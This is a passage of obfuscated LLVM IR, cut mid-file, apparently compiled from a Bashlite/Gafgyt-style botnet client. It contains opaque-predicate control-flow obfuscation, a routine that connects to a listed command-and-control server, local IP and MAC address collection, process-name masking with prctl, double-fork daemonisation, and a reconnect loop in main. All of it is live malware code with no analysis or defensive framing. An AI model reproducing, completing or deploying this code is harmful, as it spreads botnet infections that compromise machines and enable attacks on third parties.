  %33 = load i32, i32* @x.109
  %34 = load i32, i32* @y.110
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @currentServer, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* @currentServer, align 4
  %43 = load i32, i32* @x.109
  %44 = load i32, i32* @y.110
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart26, %originalBBpart2
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %53 = load i32, i32* @currentServer, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %52, i8* %56) #5
  store i32 23, i32* %3, align 4
  %58 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %59 = call i8* @strchr(i8* %58, i32 58) #10
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %51
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #10
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #10
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #10
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %51
  %69 = load i32, i32* @x.109
  %70 = load i32, i32* @y.110
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %68
  %77 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %77, i32* @mainCommSock, align 4
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %80 = load i32, i32* %3, align 4
  %81 = call i32 @connectTimeout(i32 %78, i8* %79, i32 %80, i32 30)
  %82 = icmp ne i32 %81, 0
  %83 = load i32, i32* @x.109
  %84 = load i32, i32* @y.110
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %82, label %92, label %91

; <label>:91:                                     ; preds = %originalBBpart210
  store i32 1, i32* %1, align 4
  br label %109

; <label>:92:                                     ; preds = %originalBBpart210
  %93 = load i32, i32* @x.109
  %94 = load i32, i32* @y.110
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %92
  store i32 0, i32* %1, align 4
  %101 = load i32, i32* @x.109
  %102 = load i32, i32* @y.110
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %109

; <label>:109:                                    ; preds = %originalBBpart214, %91
  %110 = load i32, i32* %1, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* @currentServer, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %111 = load i32, i32* @currentServer, align 4
  %_ = sub i32 %111, 1
  %gen = mul i32 %_, 1
  %_2 = shl i32 %111, 1
  %_3 = sub i32 %111, 1
  %gen4 = mul i32 %_3, 1
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* @currentServer, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %68
  %113 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %113, i32* @mainCommSock, align 4
  %114 = load i32, i32* @mainCommSock, align 4
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %116 = load i32, i32* %3, align 4
  %117 = call i32 @connectTimeout(i32 %114, i8* %115, i32 %116, i32 30)
  %118 = icmp ne i32 %117, 0
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %92
  store i32 0, i32* %1, align 4
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %245

; <label>:16:                                     ; preds = %0
  %17 = load i32, i32* @x.111
  %18 = load i32, i32* @y.112
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.486, i32 0, i32 0)) #5
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 53) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %2, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  store i32 %34, i32* %4, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, -1
  %37 = load i32, i32* @x.111
  %38 = load i32, i32* @y.112
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %62

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.111
  %47 = load i32, i32* @y.112
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i32 0, i32* %1, align 4
  %54 = load i32, i32* @x.111
  %55 = load i32, i32* @y.112
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %245

; <label>:62:                                     ; preds = %originalBBpart2
  store i32 16, i32* %6, align 4
  %63 = load i32, i32* %2, align 4
  %64 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %65 = call i32 @getsockname(i32 %63, %struct.sockaddr* %64, i32* %6) #5
  store i32 %65, i32* %4, align 4
  %66 = load i32, i32* %4, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %85

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.111
  %70 = load i32, i32* @y.112
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  store i32 0, i32* %1, align 4
  %77 = load i32, i32* @x.111
  %78 = load i32, i32* @y.112
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %245

; <label>:85:                                     ; preds = %62
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  store i32 %88, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %89 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.487, i32 0, i32 0), i32 0)
  store i32 %89, i32* %7, align 4
  br label %90

; <label>:90:                                     ; preds = %191, %85
  %91 = load i32, i32* @x.111
  %92 = load i32, i32* @y.112
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %100 = load i32, i32* %7, align 4
  %101 = call i8* @fdgets(i8* %99, i32 4096, i32 %100)
  %102 = icmp ne i8* %101, null
  %103 = load i32, i32* @x.111
  %104 = load i32, i32* @y.112
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %102, label %111, label %193

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i32, i32* @x.111
  %113 = load i32, i32* @y.112
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %111
  %120 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %121 = call i8* @strstr(i8* %120, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.488, i32 0, i32 0)) #10
  %122 = icmp ne i8* %121, null
  %123 = load i32, i32* @x.111
  %124 = load i32, i32* @y.112
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %122, label %131, label %191

; <label>:131:                                    ; preds = %originalBBpart216
  %132 = load i32, i32* @x.111
  %133 = load i32, i32* @y.112
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %131
  %140 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %140, i8** %9, align 8
  %141 = load i32, i32* @x.111
  %142 = load i32, i32* @y.112
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %149

; <label>:149:                                    ; preds = %originalBBpart224, %originalBBpart220
  %150 = load i8*, i8** %9, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp ne i32 %152, 9
  br i1 %153, label %154, label %173

; <label>:154:                                    ; preds = %149
  %155 = load i32, i32* @x.111
  %156 = load i32, i32* @y.112
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %154
  %163 = load i8*, i8** %9, align 8
  %164 = getelementptr inbounds i8, i8* %163, i32 1
  store i8* %164, i8** %9, align 8
  %165 = load i32, i32* @x.111
  %166 = load i32, i32* @y.112
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %149

; <label>:173:                                    ; preds = %149
  %174 = load i32, i32* @x.111
  %175 = load i32, i32* @y.112
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %173
  %182 = load i8*, i8** %9, align 8
  store i8 0, i8* %182, align 1
  %183 = load i32, i32* @x.111
  %184 = load i32, i32* @y.112
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %193

; <label>:191:                                    ; preds = %originalBBpart216
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %192, i8 0, i64 4096, i32 16, i1 false)
  br label %90

; <label>:193:                                    ; preds = %originalBBpart228, %originalBBpart212
  %194 = load i32, i32* %7, align 4
  %195 = call i32 @close(i32 %194)
  %196 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %197 = load i8, i8* %196, align 16
  %198 = icmp ne i8 %197, 0
  br i1 %198, label %199, label %242

; <label>:199:                                    ; preds = %193
  %200 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %201 = bitcast %union.anon.5* %200 to [16 x i8]*
  %202 = getelementptr inbounds [16 x i8], [16 x i8]* %201, i32 0, i32 0
  %203 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %204 = call i8* @strcpy(i8* %202, i8* %203) #5
  %205 = load i32, i32* %2, align 4
  %206 = call i32 (i32, i64, ...) @ioctl(i32 %205, i64 35111, %struct.ifreq* %11) #5
  store i32 0, i32* %10, align 4
  br label %207

; <label>:207:                                    ; preds = %238, %199
  %208 = load i32, i32* %10, align 4
  %209 = icmp slt i32 %208, 6
  br i1 %209, label %210, label %241

; <label>:210:                                    ; preds = %207
  %211 = load i32, i32* @x.111
  %212 = load i32, i32* @y.112
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %210
  %219 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %220 = bitcast %union.anon.6* %219 to %struct.sockaddr*
  %221 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %220, i32 0, i32 1
  %222 = getelementptr inbounds [14 x i8], [14 x i8]* %221, i32 0, i32 0
  %223 = load i32, i32* %10, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds i8, i8* %222, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = load i32, i32* %10, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %228
  store i8 %226, i8* %229, align 1
  %230 = load i32, i32* @x.111
  %231 = load i32, i32* @y.112
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %238

; <label>:238:                                    ; preds = %originalBBpart232
  %239 = load i32, i32* %10, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %10, align 4
  br label %207

; <label>:241:                                    ; preds = %207
  br label %242

; <label>:242:                                    ; preds = %241, %193
  %243 = load i32, i32* %2, align 4
  %244 = call i32 @close(i32 %243)
  br label %245

; <label>:245:                                    ; preds = %242, %originalBBpart28, %originalBBpart24, %15
  %246 = load i32, i32* %1, align 4
  ret i32 %246

originalBBalteredBB:                              ; preds = %originalBB, %16
  %247 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %247, i8 0, i64 16, i32 4, i1 false)
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %248, align 4
  %249 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.486, i32 0, i32 0)) #5
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %251 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %250, i32 0, i32 0
  store i32 %249, i32* %251, align 4
  %252 = call zeroext i16 @htons(i16 zeroext 53) #13
  %253 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %252, i16* %253, align 2
  %254 = load i32, i32* %2, align 4
  %255 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %256 = call i32 @connect(i32 %254, %struct.sockaddr* %255, i32 16)
  store i32 %256, i32* %4, align 4
  %257 = load i32, i32* %4, align 4
  %258 = icmp eq i32 %257, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i32 0, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  store i32 0, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  %259 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %260 = load i32, i32* %7, align 4
  %261 = call i8* @fdgets(i8* %259, i32 4096, i32 %260)
  %262 = icmp ne i8* %261, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %111
  %263 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.488, i32 0, i32 0)) #10
  %265 = icmp ne i8* %264, null
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %131
  %266 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %266, i8** %9, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %154
  %267 = load i8*, i8** %9, align 8
  %268 = getelementptr inbounds i8, i8* %267, i32 1
  store i8* %268, i8** %9, align 8
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %173
  %269 = load i8*, i8** %9, align 8
  store i8 0, i8* %269, align 1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %210
  %270 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %271 = bitcast %union.anon.6* %270 to %struct.sockaddr*
  %272 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %271, i32 0, i32 1
  %273 = getelementptr inbounds [14 x i8], [14 x i8]* %272, i32 0, i32 0
  %274 = load i32, i32* %10, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds i8, i8* %273, i64 %275
  %277 = load i8, i8* %276, align 1
  %278 = load i32, i32* %10, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %279
  store i8 %277, i8* %280, align 1
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.115
  %4 = load i32, i32* @y.116
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [4096 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca [1024 x i8], align 16
  %28 = alloca i32, align 4
  %29 = alloca [10 x i8*], align 16
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %14, align 8
  %33 = call i8* @getBuild()
  %34 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %35 = call i8* @inet_ntoa(i32 %34) #5
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.491, i32 0, i32 0), i8* %33, i8* %35)
  %37 = load i8**, i8*** %13, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i8**, i8*** %13, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i64 @strlen(i8* %42) #10
  %44 = call i8* @strncpy(i8* %39, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i64 %43) #5
  %45 = load i8**, i8*** %13, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %46, align 8
  %47 = load i8*, i8** %14, align 8
  %48 = ptrtoint i8* %47 to i64
  %49 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %48, i32 0, i32 0, i32 0)
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #5
  %52 = xor i32 %50, %51
  call void @srand(i32 %52) #5
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = call i32 @getpid() #5
  %55 = xor i32 %53, %54
  call void @init_rand(i32 %55)
  %56 = call i32 @getOurIP()
  %57 = call i32 @fork() #5
  store i32 %57, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = load i32, i32* @x.115
  %60 = load i32, i32* @y.116
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %86

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* @x.115
  %69 = load i32, i32* @y.116
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %67
  %76 = load i32, i32* %15, align 4
  %77 = call i32 @waitpid(i32 %76, i32* %17, i32 0)
  call void @exit(i32 0) #14
  %78 = load i32, i32* @x.115
  %79 = load i32, i32* @y.116
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  unreachable

; <label>:86:                                     ; preds = %originalBBpart2
  %87 = load i32, i32* @x.115
  %88 = load i32, i32* @y.116
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %86
  %95 = load i32, i32* %15, align 4
  %96 = icmp ne i32 %95, 0
  %97 = load i32, i32* @x.115
  %98 = load i32, i32* @y.116
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %96, label %116, label %105

; <label>:105:                                    ; preds = %originalBBpart219
  %106 = call i32 @fork() #5
  store i32 %106, i32* %16, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %105
  call void @exit(i32 0) #14
  unreachable

; <label>:109:                                    ; preds = %105
  %110 = load i32, i32* %16, align 4
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %113, label %112

; <label>:112:                                    ; preds = %109
  br label %114

; <label>:113:                                    ; preds = %109
  br label %114

; <label>:114:                                    ; preds = %113, %112
  br label %115

; <label>:115:                                    ; preds = %114
  br label %117

; <label>:116:                                    ; preds = %originalBBpart219
  br label %117

; <label>:117:                                    ; preds = %116, %115
  br label %118

; <label>:118:                                    ; preds = %117
  %119 = call i32 @setsid() #5
  %120 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.492, i32 0, i32 0)) #5
  %121 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %122

; <label>:122:                                    ; preds = %657, %125, %118
  %123 = call i32 @initConnection()
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %127

; <label>:125:                                    ; preds = %122
  %126 = call i32 @sleep(i32 5)
  br label %122

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* @x.115
